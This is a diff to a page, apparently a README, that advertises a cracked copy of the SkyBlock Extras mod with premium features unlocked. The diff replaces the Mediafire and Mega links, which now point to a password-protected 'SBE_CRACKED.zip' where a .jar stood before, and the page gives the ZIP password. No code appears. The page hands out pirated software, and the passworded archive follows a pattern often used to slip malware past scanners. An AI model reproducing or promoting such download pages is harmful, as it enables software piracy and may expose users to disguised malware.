@@ -22,10 +22,10 @@ This is a fully cracked version of SkyBlock Extras with all premium features unl
 **Latest Version: v2.3.1 Cracked**
 
 Primary Download:  
-[Mediafire Mirror](https://www.mediafire.com/file/p6iuapj9p71gc9s/SBE_CRACKED.jar/file)
+[Mediafire Mirror](https://www.mediafire.com/file/8xup1i8k4az1o18/SBE_CRACKED.zip/file)
 
 Alternative Mirrors:  
-- [Mega.io](https://mega.nz/file/PaIihAQI#aVpQm_tQiBf1-GdE5Zzy25RMNysU9OFjgDtA1Jtdok4)  
+- [Mega.io](https://mega.nz/file/jCxzCQBK#0ZEV1bV31qHmpRRbONYlzXvFHlFjOR5Ek1vMik_fkP4)  
 
 **ZIP Password:** `sbe2025free`
 
